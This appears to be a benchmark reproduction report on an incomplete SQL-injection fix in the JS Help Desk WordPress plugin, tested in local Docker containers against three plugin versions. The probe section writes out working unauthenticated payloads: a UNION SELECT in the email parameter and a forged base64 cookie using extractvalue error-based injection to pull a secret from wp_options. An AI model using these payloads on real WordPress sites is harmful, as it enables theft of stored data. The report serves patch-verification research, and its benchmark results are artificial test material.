PatchClosure-Bench repro — js-help-desk-wordpress-plugin-cve-2023-7337
Pair: CVE-2023-50839 -> CVE-2023-7337  (JS Help Desk / js-support-ticket, SQL injection / CWE-89)
Variant A (same SELECT query in two sibling functions; read-exfil of protected wp_options.pcb_secret)
Date: 2026-07-11

ENVIRONMENT (official images, real Docker)
  wordpress:php8.2-apache + mariadb:11 + wp-cli, one WP per profile, plugin installed at up-time
  from wordpress.org SVN tag zips (slug js-support-ticket):
    v0 = 2.8.1  (pre CVE-2023-50839 fix)     -> http://127.0.0.1:39510
    v1 = 2.8.2  (CVE-2023-50839-patched, TARGET) -> http://127.0.0.1:39511
    v2 = 2.8.3  (CVE-2023-7337-patched)       -> http://127.0.0.1:39512
  Verified plugin versions in-container: 2.8.1 / 2.8.2 / 2.8.3.
  Activation created the js_ticket_* tables (incl. wp_js_ticket_tickets) and the [jssupportticket]
  shortcode page (id=4). Canary ${PCB_FLAG} planted in wp_options.pcb_secret (protected DB row).

SINKS (modules/ticket/model.php) — SAME query, two sibling functions:
  SELECT id FROM wp_js_ticket_tickets WHERE email='<emailaddress>' AND ticketid='<trackingid>'
  email/trackingid come from a base64-JSON "token" (encoder.php mcrypt removed => plain base64 =>
  attacker-forgeable, unauthenticated).
  - seed sink  = getTicketidForVisitor() via showticketstatus; returns id -> 302 Location reflects it.
  - residual   = validateTicketDetailForVisitor() reads the js-support-ticket-token-tkstatus COOKIE.

PATCH DIFFERENTIAL (patch.diff):
  CVE-2023-50839 (2.8.1->2.8.2): getTicketidForVisitor adds sanitize_email(email/trackingid).
  CVE-2023-7337  (2.8.2->2.8.3): validateTicketDetailForVisitor adds esc_sql(email/trackingid)
                 -- the sibling copy the 2.8.2 fix LEFT UNESCAPED.

PROBES (unauthenticated, real plugin code at runtime over HTTP):
  seed  "param-union": POST form_request=jssupportticket&jstmod=ticket&task=showticketstatus
        &email=<zzz' UNION SELECT option_value FROM wp_options WHERE option_name=0x7063625f736563726574 LIMIT 1-- ->
        flag reflected in the 302 Location as jssupportticketid=<flag>.
  residual "cookie-error": forge cookie js-support-ticket-token-tkstatus =
        base64(json({emailaddress:<x' AND extractvalue(1,concat(0x7e,(SELECT SUBSTRING(option_value,N,20)
        FROM wp_options WHERE option_name=0x7063625f736563726574)))-- ->, trackingid:"1"})),
        GET the shortcode page with jstlay=ticketdetail -> validateTicketDetailForVisitor -> the XPATH
        error carrying the secret renders in the page (wpdb->show_errors on via harness mu-plugin);
        secret pulled in 20-char chunks (extractvalue 32-char limit) and reassembled.

OBSERVED RESULTS
  seed @ v0:   302 Location .../?...&jssupportticketid=PCBFLAG_95027620c048e63c79c65653dc47ec31   REACHES
  seed @ v1:   302 Location .../?...&jstlay=ticketstatus  ("Record not found", sanitize_email)     BLOCKED
  residual @ v1: recovered_flag = PCBFLAG_95027620c048e63c79c65653dc47ec31
                 fragments = ["PCBFLAG_95027620c048","e63c79c65653dc47ec31",""]                     REACHES
  residual @ v2: recovered_flag = "" (esc_sql escapes the quote, no injection, no error)            BLOCKED

